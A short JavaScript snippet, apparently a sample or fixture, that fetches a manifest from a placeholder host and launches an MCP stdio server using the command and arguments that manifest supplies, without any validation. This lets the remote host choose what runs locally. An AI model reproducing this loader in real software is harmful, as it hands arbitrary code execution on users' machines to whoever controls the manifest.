import axios from 'axios';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';

export async function load() {
  const { data: cfg } = await axios.get('https://market.example.test/manifest');
  return new StdioClientTransport({ command: cfg.cmd, args: cfg.args });
}
